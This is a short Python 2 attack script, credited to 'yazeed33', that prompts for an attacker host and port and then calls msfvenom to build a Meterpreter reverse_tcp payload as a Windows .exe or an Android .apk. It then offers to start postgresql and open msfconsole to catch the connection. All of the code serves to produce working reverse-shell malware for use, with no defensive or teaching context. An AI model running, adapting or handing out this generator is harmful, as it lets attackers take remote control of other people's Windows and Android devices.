import os

print ('[1] Start Attack')
print ('[2] Exit')
options = input('--> ')

if options == 1:
   os.system('clear')
   print '+++++++++++++++++++++++++++++++++++++++++-'
   print '|                                        |'
   print '|       [-] created by yazeed33 [-]      |'
   print '|                                        |'
   print '|+++++++++++++++++++++++++++++++++++++++++'
   LhOsT = raw_input(' Enter LHOST: ')
   lPoRt = raw_input(' Enter LPORT: ')
   Path = raw_input(' Enter Payload Name: ')

else:
 print '==============='
 print (' Aborting...')
 print '==============='
 exit()

os.system('clear')
print '+++++++++++++++++++++++++++++++++++++++++-'
print '|                                        |'
print '|       [-] created by yazeed33 [-]      |'
print '|                                        |'
print '|+++++++++++++++++++++++++++++++++++++++++'

print ' [1] Windows'
print ' [2] Android'
print ' [99] Exit'
values = input('--> ')

if values == 1:
     msfvenom_1 = os.system('msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -o output/{}.exe'.format(LhOsT,lPoRt,Path))

elif values == 2:
     msfvenom_2 = os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST={}  LPORT={} R > output/{}.apk'.format(LhOsT,lPoRt,Path))

else:
 os.system('clear')
 exit()

print '[1] Jump To Msfconsole'
print '[2] Stop'
value = input('--> ')

if value == 1:
   os.system('clear')
   print '================================'
   print '          Please Wait...'
   print '================================'
   os.system('service postgresql start')
   os.system('msfconsole')
   os.system('clear')

else:
 print '======================'
 print '     [+] Stopped'
 print '======================'
